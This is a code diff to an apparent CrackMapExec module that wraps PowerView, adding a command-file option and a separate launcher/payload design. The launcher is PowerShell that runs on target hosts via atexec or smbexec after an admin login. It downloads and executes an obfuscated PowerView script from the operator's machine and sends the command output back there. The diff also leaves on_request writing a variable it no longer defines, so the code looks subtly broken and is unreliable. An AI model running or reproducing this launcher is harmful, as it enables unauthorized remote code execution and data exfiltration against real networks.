@@ -13,24 +13,39 @@ class CMEModule:
 
     description = "Wrapper for PowerView's functions"
 
+    chain_support = False
+
     def options(self, context, module_options):
         '''
-            COMMAND  Powerview command to run
+            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
+            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
         '''
 
-        self.command = None
-        if not 'COMMAND' in module_options:
-            context.log.error('COMMAND option is required!')
+        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
+            context.log.error('COMMAND or CMDFILE options are required!')
+            exit(1)
+
+        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
+            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
             exit(1)
 
         if 'COMMAND' in module_options:
             self.command = module_options['COMMAND']
 
-    def on_admin_login(self, context, connection):
+        elif 'CMDFILE' in module_options:
+            path = os.path.expanduser(module_options['CMDFILE'])
 
-        powah_command = self.command + ' | Out-String'
+            if not os.path.exists(path):
+                context.log.error('Path to CMDFILE invalid!')
+                exit(1)
 
-        payload = '''
+            with open(path, 'r') as cmdfile:
+                self.command = cmdfile.read().strip()
+
+    def launcher(self, context, command):
+        powah_command = command + ' | Out-String'
+
+        launcher = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/PowerView.ps1');
         $data = {command}
         $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
@@ -46,19 +61,22 @@ class CMEModule:
                                           addr=context.localip,
                                           command=powah_command)
 
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload, methods=['atexec', 'smbexec'])
-        context.log.success('Executed payload')
+        return create_ps_command(launcher)
+
+    def payload(self, context, command):
+        with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
+            return obfs_ps_script(ps_script.read())
+
+    def on_admin_login(self, context, connection, launcher, payload):
+        connection.execute(launcher, methods=['atexec', 'smbexec'])
+        context.log.success('Executed launcher')
 
     def on_request(self, context, request):
         if 'PowerView.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read())
-                request.wfile.write(ps_script)
+            request.wfile.write(ps_script)
 
         else:
             request.send_response(404)
